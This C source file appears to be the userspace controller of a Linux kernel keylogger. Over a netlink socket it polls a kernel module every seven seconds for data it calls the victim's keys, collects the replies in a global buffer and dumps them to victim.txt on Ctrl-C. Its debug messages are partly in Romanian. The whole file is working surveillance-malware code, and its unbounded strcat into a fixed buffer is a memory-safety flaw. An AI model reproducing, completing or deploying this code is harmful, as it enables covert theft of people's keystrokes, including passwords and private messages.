#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <string.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/socket.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>

#define NETLINK_USER 30
#define MAX_PAYLOAD 1024
#define BUFF_SIZE 100000

struct sockaddr_nl src_addr, dest_addr;
struct nlmsghdr *nlh = NULL;
struct nlmsghdr *nlh2 = NULL;
struct msghdr msg, resp;
struct iovec iov, iov2;
int sock_fd;
char victimsKeys[BUFF_SIZE];

void signal_handler(){
    printf("Starting Writing routine...\n");
    int open_fd = open("victim.txt", O_RDWR | O_APPEND);
    if (open_fd < 0){
        printf("teapa cumetre amice nu merge fisierul te pupa jean\n");
    }
    int rc = write(open_fd, victimsKeys, strlen(victimsKeys));
    if (rc < 0 || rc == 0){
        printf("a scris 0 sau eroare\n");
    }
    printf("Ended writing in file\n");
    exit(0);
}

void set_signal(){
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));

    sa.sa_flags = SA_SIGINFO;
    sa.sa_handler = signal_handler;
    sigaction(SIGINT, &sa, NULL);
}

int main(int args, char *argv[])
{
    set_signal();
    
    sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);

    if(sock_fd < 0)
        return -1;

    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid = getpid();

    if(bind(sock_fd, (struct sockaddr*)&src_addr, sizeof(src_addr))){
        perror("bind() error\n");
        close(sock_fd);
        return -1;
    }

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid = 0;  
    dest_addr.nl_groups = 0; 
    

    nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
    memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
    nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0; 

    nlh2 = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
    memset(nlh2, 0, NLMSG_SPACE(MAX_PAYLOAD));
    nlh2->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
    nlh2->nlmsg_pid = getpid();
    nlh2->nlmsg_flags = 0; 

    strcpy(NLMSG_DATA(nlh), "Hello test message from userspace...");

    iov.iov_base = (void *)nlh; 
    iov.iov_len = nlh->nlmsg_len;
    msg.msg_name = (void *)&dest_addr;
    msg.msg_namelen = sizeof(dest_addr);
    msg.msg_iov = &iov;    
    msg.msg_iovlen = 1;

    iov2.iov_base = (void *)nlh2;  
    iov2.iov_len = nlh2->nlmsg_len;
    resp.msg_name = (void *)&dest_addr;
    resp.msg_namelen = sizeof(dest_addr);
    resp.msg_iov = &iov2; 
    resp.msg_iovlen = 1;

    int ret = sendmsg(sock_fd, &msg, 0);   

    recvmsg(sock_fd, &resp, 0);

    printf("Mesaj primit: %s\n", (char *) NLMSG_DATA(nlh2));  

    char usermsg[3];
    while (1) {
        sleep(7);
        strcpy(usermsg,"a");
        strcpy(NLMSG_DATA(nlh), usermsg);


        printf("\nSending request to victim...\n", usermsg);

        ret = sendmsg(sock_fd, &msg, 0);   
        
        recvmsg(sock_fd, &resp, 0);  
        strcat(victimsKeys,(char *)NLMSG_DATA(nlh2));

        printf("\nReceived message payload: %s\n", (char *)NLMSG_DATA(nlh2));   

}
    close(sock_fd);

    return 0;
}
